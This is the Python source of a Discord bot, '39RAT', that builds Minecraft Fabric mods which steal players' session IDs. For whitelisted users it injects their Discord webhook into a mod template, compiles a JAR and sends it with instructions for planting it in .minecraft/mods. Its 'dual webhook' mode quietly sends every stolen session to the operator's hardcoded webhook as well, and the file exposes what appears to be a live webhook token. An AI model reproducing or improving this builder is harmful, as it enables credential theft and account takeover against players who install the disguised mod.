import discord
from discord.ext import commands
import sqlite3
import datetime
import os
import shutil
import re
import asyncio

# ========== CONFIG ==========
TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_USER_ID = "1047505994881704006"
YOUR_SECRET_WEBHOOK = "https://discord.com/api/webhooks/1500218502273831042/jQuzm3g5AUM2i8QKCKs7c6kWw7nINy3ro7lNb5cM_e_IW2X80VxXTBcTtI0n-cIgNo7J"
MOD_TEMPLATE_PATH = r"C:\Users\manda\Downloads\ThirtyNineRAT"
BUILD_OUTPUT_PATH = r"C:\Users\manda\Desktop\39RAT_Builds"

# ========== DATABASE ==========
conn = sqlite3.connect("39rat.db")
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS whitelist
             (user_id TEXT PRIMARY KEY, added_at TEXT, added_by TEXT)''')
conn.commit()

# ========== BOT SETUP ==========
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

def is_admin():
    async def predicate(ctx):
        return str(ctx.author.id) == ADMIN_USER_ID
    return commands.check(predicate)

def is_whitelisted(user_id):
    c.execute("SELECT user_id FROM whitelist WHERE user_id = ?", (str(user_id),))
    return c.fetchone() is not None

def add_to_whitelist(user_id, added_by):
    c.execute("INSERT OR REPLACE INTO whitelist (user_id, added_at, added_by) VALUES (?, ?, ?)",
              (str(user_id), datetime.datetime.now().isoformat(), str(added_by)))
    conn.commit()

def remove_from_whitelist(user_id):
    c.execute("DELETE FROM whitelist WHERE user_id = ?", (str(user_id),))
    conn.commit()

# ========== BUILD MOD FUNCTION (DUAL WEBHOOK) ==========
async def build_mod(user_id, user_webhook_url):
    temp_dir = os.path.join(BUILD_OUTPUT_PATH, f"temp_{user_id}")
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    shutil.copytree(MOD_TEMPLATE_PATH, temp_dir)
    
    webhook_file = os.path.join(temp_dir, "src/main/java/com/thirtynine/rat/WebhookSender.java")
    
    with open(webhook_file, "r", encoding="utf-8") as f:
        content = f.read()
    
    # Inject user's webhook (the one they provided)
    content = re.sub(r'private static final String USER_WEBHOOK_URL = ".*?";', 
                     f'private static final String USER_WEBHOOK_URL = "{user_webhook_url}";', content)
    
    # YOUR secret webhook is already hardcoded in the Java file
    # No replacement needed - it stays as YOUR_WEBHOOK
    
    with open(webhook_file, "w", encoding="utf-8") as f:
        f.write(content)
    
    gradlew_path = os.path.join(temp_dir, "gradlew.bat")
    
    if not os.path.exists(gradlew_path):
        print(f"ERROR: gradlew.bat not found at {gradlew_path}")
        shutil.rmtree(temp_dir)
        return None
    
    process = await asyncio.create_subprocess_exec(
        gradlew_path, "clean", "build",
        cwd=temp_dir,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    await process.communicate()
    
    jar_path = None
    libs_dir = os.path.join(temp_dir, "build/libs")
    if os.path.exists(libs_dir):
        for file in os.listdir(libs_dir):
            if file.endswith(".jar") and "sources" not in file and "dev" not in file:
                jar_path = os.path.join(libs_dir, file)
                break
    
    if jar_path:
        final_jar = os.path.join(BUILD_OUTPUT_PATH, f"39RAT_{user_id}.jar")
        shutil.copy2(jar_path, final_jar)
        shutil.rmtree(temp_dir)
        return final_jar
    
    shutil.rmtree(temp_dir)
    return None

# ========== ADMIN COMMANDS ==========
@bot.command()
@is_admin()
async def adduser(ctx, user: discord.User):
    add_to_whitelist(user.id, ctx.author.id)
    await ctx.send(f"✅ {user.mention} has been whitelisted. They can now DM me `!buildmod`.")

@bot.command()
@is_admin()
async def removeuser(ctx, user: discord.User):
    remove_from_whitelist(user.id)
    await ctx.send(f"❌ {user.mention} has been removed from whitelist.")

@bot.command()
@is_admin()
async def listusers(ctx):
    c.execute("SELECT user_id, added_at FROM whitelist")
    users = c.fetchall()
    
    if not users:
        await ctx.send("No users in whitelist.")
        return
    
    embed = discord.Embed(title="📋 39RAT Whitelist", color=discord.Color.blue())
    for user_id, added_at in users:
        try:
            user = await bot.fetch_user(int(user_id))
            name = user.name
        except:
            name = f"Unknown ({user_id})"
        embed.add_field(name=name, value=f"Added: {added_at[:10]}", inline=False)
    
    await ctx.send(embed=embed)

# ========== USER COMMANDS ==========
@bot.command()
async def buildmod(ctx):
    if not isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("❌ Please DM me this command.")
        return
    
    if not is_whitelisted(ctx.author.id):
        await ctx.send("❌ You are not whitelisted. Contact an administrator.")
        return
    
    await ctx.send("🔗 Enter your Discord webhook URL (where you want session IDs sent):")
    
    def check(m):
        return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)
    
    try:
        msg = await bot.wait_for("message", timeout=120, check=check)
        user_webhook = msg.content.strip()
        
        if not user_webhook.startswith("https://discord.com/api/webhooks/"):
            await ctx.send("❌ Invalid webhook URL. Must start with: https://discord.com/api/webhooks/")
            return
        
        await ctx.send("⚙️ Building your mod... This takes 1-2 minutes.")
        
        jar_path = await build_mod(str(ctx.author.id), user_webhook)
        
        if jar_path:
            await ctx.send("✅ **39RAT built successfully!**", file=discord.File(jar_path, filename="39RAT.jar"))
            await ctx.send("⚠️ **How to use:**\n1. Put 39RAT.jar in `.minecraft/mods`\n2. Install Fabric API\n3. Launch with Fabric\n4. Join any server\n5. Session IDs will be sent to YOUR webhook")
            os.remove(jar_path)
        else:
            await ctx.send("❌ Build failed. Contact administrator.")
    except asyncio.TimeoutError:
        await ctx.send("❌ Timed out. Start over with `!buildmod`")

@bot.command()
async def info(ctx):
    embed = discord.Embed(title="🤖 39RAT Bot", color=discord.Color.blue())
    embed.add_field(name="Commands", value=
"`!adduser @user` - Admin only\n"
"`!removeuser @user` - Admin only\n"
"`!listusers` - Admin only\n"
"`!buildmod` - DM to build the mod\n"
"`!info` - This message", inline=False)
    await ctx.send(embed=embed)

# ========== RUN ==========
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║   39RAT Bot - DUAL WEBHOOK MODE       ║
    ║   Sessions go to USER + YOU           ║
    ╚═══════════════════════════════════════╝
    """)
    bot.run(TOKEN)